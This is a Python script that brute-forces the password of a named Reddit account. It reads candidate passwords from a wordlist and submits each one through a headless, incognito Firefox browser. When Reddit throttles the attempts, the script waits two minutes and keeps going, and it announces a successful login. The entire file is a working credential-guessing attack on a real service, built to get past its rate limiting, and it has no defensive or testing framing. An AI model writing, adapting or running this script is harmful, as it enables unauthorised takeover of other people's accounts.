#!/bin/python

import argparse
import sys
import time
from splinter import Browser
from urllib3 import exceptions

# Func to attempt a user login
def check_login(browser, user, password):
    # For each password input, it may need to iterate over that
    #  input several times, to cater for exceptions, throttling
    #  from Reddit, and or other weirdness
    while True:
        try:
            # visit the page
            browser.visit("https://reddit.com/login")

            # find and fill in the form using xpath expressions
            form = browser.find_by_xpath("/html/body/div[1]/main/div[1]/div/div[2]/form").first
            form.find_by_name("username").first.fill(user)
            form.find_by_name("password").first.fill(password)

            # submit the form
            form.find_by_xpath("/html/body/div[1]/main/div[1]/div/div[2]/form/fieldset[5]/button").click()

        except ConnectionRefusedError:
            continue

        except exceptions.NewConnectionError:
            continue

        except exceptions.MaxRetryError:
            continue

        else:
            # If not exceptions we're raised, then check what the page can tell
            #  us of the state. Per https://github.com/cobrateam/splinter/issues/509
            #  you can see that Selenium/Webdriver has an issue with exposing
            #  the status code returned, thus you have to check the page to
            #  determine the status/condition of a request
            if browser.is_text_present("Incorrect username or password"):
                # Standard message when the username or password is incorrect
                break
            elif browser.is_text_present("You are doing that too much. try again in"):
                # This is the reponse/update that happens when you're being
                #  throttled because of too many failed login attempts
                print(browser.find_by_xpath("/html/body/div[1]/main/div[1]/div/div[2]/form/fieldset[5]/div/span").first.text)
                time.sleep(120)
                continue
            elif browser.is_element_present_by_xpath('//*[@id="USER_DROPDOWN_ID"]'):
                # This xpath expression matches the user profile menu, that is
                #  only present after a use successfully logs in
                print("We have a winner!")
                sys.exit()
            else:
                # This shouldn't be possible, but just in case
                print("Not sure what we have here")
                print(browser.html)

# Begin main program flow, set up program args
parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('-f', '--file', dest='file', default="input.txt",
                    help='the file to process (default: input.txt)')
parser.add_argument('-u', '--user', dest='user', required=True,
                    help='the user to process')
args = parser.parse_args()

# Create browser instance, which is passed to func later
browser = Browser('firefox', headless=True, incognito=True)

# Iterate over the input file, one password per-line
with open(args.file, "r") as a_file:
    for line in a_file:
        stripped_line = line.strip()
        print('Checking... "{}"'.format(stripped_line))
        check_login(browser, args.user, stripped_line)
